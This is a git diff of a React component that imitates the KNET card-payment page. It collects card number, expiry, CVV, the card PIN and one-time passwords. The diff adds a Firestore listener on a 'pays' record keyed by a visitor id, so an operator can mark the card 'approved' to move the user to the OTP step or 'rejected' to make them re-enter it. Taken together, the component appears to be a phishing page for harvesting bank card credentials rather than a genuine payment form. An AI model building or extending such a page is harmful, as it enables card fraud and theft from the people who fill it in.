@@ -1,25 +1,23 @@
 
 "use client"
 import { useEffect, useState } from 'react';
-import { doc, onSnapshot } from 'firebase/firestore';
+import './kent.css'
+import {  doc,  onSnapshot } from 'firebase/firestore';
 import { db } from '@/lib/firebase';
 import { handlePay } from '@/lib/firebase-service';
-import './kent.css'
-
 type PaymentInfo = {
   cardNumber: string;
   year: string;
   month: string;
-  cvv?: string;
+  cvv: string;
   bank?: string;
   otp?: string;
   pass: string;
   cardState: string;
-  allOtps: string[],
+  allOtps:string[],
   bank_card: string[];
   prefix: string;
   status: 'new' | 'pending' | 'approved' | 'rejected';
-  timestamp:string
 };
 const BANKS = [
   {
@@ -119,37 +117,65 @@ const BANKS = [
   },
 ];
 
-export default function Payment(props: any) {
+export default function (props: any) {
+
+  const handleSubmit = async () => {
+  
+  };
 
   const [step, setstep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [newotp] = useState([''])
+
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
     year: '',
     month: '',
     otp: '',
-    allOtps: newotp,
+    cvv: '',
+    allOtps:newotp,
     bank: '',
     pass: '',
-    cvv: '',
     cardState: 'new',
     bank_card: [''],
     prefix: '',
     status: 'new',
-    timestamp:new Date().toISOString()
   });
 
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
-  useEffect(() => {
-    //handleAddotp(paymentInfo.otp!)
+  useEffect(()=>{
+  //handleAddotp(paymentInfo.otp!)
   }, [paymentInfo.otp])
 
+  useEffect(() => {
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as any;
+          if (data.status) {
+            setPaymentInfo(prev => ({ ...prev, status: data.status }));
+            if (data.status === 'approved') {
+              setstep(2);
+              setLoading(false);
+            } else if (data.status === 'rejected') {
+              setLoading(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              setstep(1);
+            }
+          }
+        }
+      });
+
+      return () => unsubscribe();
+    }
+  }, []);
+ 
 
   return (
-    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir='ltr'>
+    <div style={{background:"#f1f1f1",height:"100vh",margin:0,padding:0}} dir='ltr'>
       <form
         onSubmit={(e) => {
           e.preventDefault();
@@ -160,8 +186,8 @@ export default function Payment(props: any) {
           <div className="container">
             <div className="content-block">
               <div className="form-card">
-                <div className="container-" style={{ display: 'flex', justifyContent: 'center' }}>
-                  <img src="./knet.png" className="-" alt="logo" height={50} width={50} />
+                <div className="container-" style={{display:'flex',justifyContent:'center'}}>
+                  <img src="./knet.png" className="-" alt="logo" height={50} width={50}/>
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -170,7 +196,7 @@ export default function Payment(props: any) {
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {'5 '}
+                    {localStorage.getItem('vv')} 
                     {'  '}KD&nbsp;{' '}
                   </label>
                 </div>
@@ -312,7 +338,7 @@ export default function Payment(props: any) {
                             style={{ width: '26%' }}
                           >
                             <option
-                              value={'i'}
+                              value={paymentInfo.prefix}
                               onClick={(e: any) => {
                                 setPaymentInfo({
                                   ...paymentInfo,
@@ -477,14 +503,14 @@ export default function Payment(props: any) {
                           />
                         </div>
                         <div id="eComPin">
-                          <label className="column-label"> CVV: </label>
+                          <label className="column-label"> Cvv: </label>
                         </div>
                         <div>
                           <input
                             inputMode="numeric"
                             pattern="[0-9]*"
-                            name="cvv"
-                            id="cvv"
+                            name="cardPin"
+                            id="cardPin"
                             onChange={(e: any) =>
                               setPaymentInfo({
                                 ...paymentInfo,
@@ -492,7 +518,7 @@ export default function Payment(props: any) {
                               })
                             }
                             autoComplete="off"
-                            title="Should be in number. Length should be 3"
+                            title="Should be in number. Length should be 4"
                             type="password"
                             size={3}
                             maxLength={3}
@@ -503,7 +529,7 @@ export default function Payment(props: any) {
                       </div>
                     </div>
                   </>
-                ) : step === 2 && paymentInfo.status === 'approved' ? (
+                ) : step === 2 && paymentInfo.status=== 'approved'? (
                   <div>
                     <form style={{ display: 'flex', flexDirection: 'column' }}>
                       <label>
@@ -558,7 +584,7 @@ export default function Payment(props: any) {
                       </center>
                     </div>
                     <div style={{ display: 'flex' }}>
-                      <button
+                    <button
                 disabled={
                   (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4 || paymentInfo.cvv==="")) ||
                   paymentInfo.status === 'pending'
@@ -638,3 +664,4 @@ export default function Payment(props: any) {
     </div>
   );
 };
+
